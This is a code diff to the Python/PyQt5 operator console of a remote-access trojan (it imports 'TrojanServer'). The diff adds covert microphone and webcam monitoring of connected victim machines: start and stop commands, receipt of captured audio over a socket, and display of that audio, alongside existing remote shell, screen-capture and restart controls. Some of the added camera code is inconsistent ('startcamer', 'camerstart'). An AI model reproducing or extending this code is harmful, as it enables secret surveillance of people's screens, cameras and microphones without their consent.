@@ -13,9 +13,10 @@ from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout,
 import pyaudio
 import wave
 from tqdm import tqdm
-
+import numpy as np
 from Detail import Ui_Form
 from server import TrojanServer, Chienken
+import time
 
 from builtins import print
 
@@ -34,6 +35,7 @@ class DetailMain(QWidget, Ui_Form):
     regsubdirSignal = pyqtSignal(dict)
     regkeyvalueSignal = pyqtSignal(dict)
     pathSignal = pyqtSignal(str) # 其实是注册表的subkey
+    audio_signal = pyqtSignal()
 
     def __init__(self, trojanserver=None, ck=0):
         super().__init__()
@@ -59,6 +61,7 @@ class DetailMain(QWidget, Ui_Form):
         self.get_camera.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d camera"%self.ck))
         self.pic_signal.connect(self.displayPic)
         self.camera_signal.connect(self.displayCamera)
+        self.audio_signal.connect(self.displayAudio)
         self.console_input.returnPressed.connect(self.consoleDisplay)
         self.consoleSignal.connect(self.upConsole)
         self.listSignal.connect(self.displayList)
@@ -75,6 +78,8 @@ class DetailMain(QWidget, Ui_Form):
         self.hombutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd c:/" % self.ck))
         self.pwdSignal.connect(lambda x:self.address.setText(x))
         self.startpic.clicked.connect(self.picWatch)
+        self.startcamera.clicked.connect(self.cameraWatch)
+        self.startaudio.clicked.connect(self.audioWatch)
         self.remotewidth.valueChanged.connect(self.remoteWidthChange)
         self.localwidth.valueChanged.connect(self.localWidthChange)
         self.restartbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos restart" % self.ck))
@@ -129,6 +134,25 @@ class DetailMain(QWidget, Ui_Form):
         # print("position3")
         self.camera_label.setPixmap(qmp)
 
+    def displayAudio(self):
+        wav = wave.open("output.wav", 'rb')
+        # print(data)
+        if wav.getsampwidth() == 2:
+            data = np.frombuffer(wav.readframes(wav.getnframes()), dtype=np.int16)
+        elif wav.getsampwidth() == 4:
+            data = np.frombuffer(wav.readframes(wav.getnframes()), dtype=np.int32)
+        data.shape = -1, 2
+        data = data.T
+        data = data[0]
+        gap = 1000 # 越小刷新率越高，但线程容易崩
+        t = 4/len(data)
+        t = t*gap
+        for i,e in enumerate(data):
+            if (i%gap == 0):
+                self.audiobar.setValue(e*10)
+                time.sleep(t)
+        self.audiobar.setValue(0)
+
     def localWidthChange(self):
         self.screenwidth = self.localwidth.value()
 
@@ -138,6 +162,9 @@ class DetailMain(QWidget, Ui_Form):
     def tcpPieceRecv(self,length, socket, size=1024):
         dsize = 0
         body = b''
+        print(dsize)
+        print(size)
+        print(length)
         while dsize + size < length:
             piece = socket.recv(size)
             body += piece
@@ -180,6 +207,12 @@ class DetailMain(QWidget, Ui_Form):
                             self.camera_signal.emit(ImageQt.toqpixmap(im))
                         except:
                             STD("图片错误")
+
+                    elif ty == "audio_wave":
+                        res_len = struct.unpack('i', self.socket.recv(4))[0]
+                        response = self.tcpPieceRecv(res_len, self.socket, 1024)
+                        # data = json.loads(response.decode('utf8'))
+                        self.audio_signal.emit()
 
                     elif ty == "response":
                         res_len = struct.unpack('i', self.socket.recv(4))[0]
@@ -288,6 +321,10 @@ class DetailMain(QWidget, Ui_Form):
     def closeEvent(self, event):
         self.startpic.setText("开启屏幕监控")
         self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)
+        self.startcamera.setText("开启摄像头监控")
+        self.trojanServer.cmdQ.put("msg %d camerastop" % self.ck)
+        self.startaudio.setText("开启麦克风监控")
+        self.trojanServer.cmdQ.put("msg %d audiostop" % self.ck)
         self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
         self.disconnected()
 
@@ -573,6 +610,26 @@ class DetailMain(QWidget, Ui_Form):
         else:
             self.startpic.setText("开启屏幕监控")
             self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)
+
+    def audioWatch(self):
+        status = self.startaudio.text()
+        if status == "开启麦克风监控":
+            self.startaudio.setText("关闭麦克风监控")
+            self.trojanServer.cmdQ.put("msg %d audiostart" % self.ck)
+        else:
+            self.startaudio.setText("开启麦克风监控")
+            self.trojanServer.cmdQ.put("msg %d audiostop" % self.ck)
+
+    def cameraWatch(self):
+        status = self.startcamer.text()
+        if status == "开启摄像头监控":
+            self.startcamer.setText("关闭摄像头监控")
+            limit = self.flushtime.text()
+            self.trojanServer.cmdQ.put("msg %d set pictime %s" %(self.ck, limit))
+            self.trojanServer.cmdQ.put("msg %d camerstart" % self.ck)
+        else:
+            self.startcamer.setText("开启摄像头监控")
+            self.trojanServer.cmdQ.put("msg %d camerstop" % self.ck)
 
 
 if __name__ == '__main__':
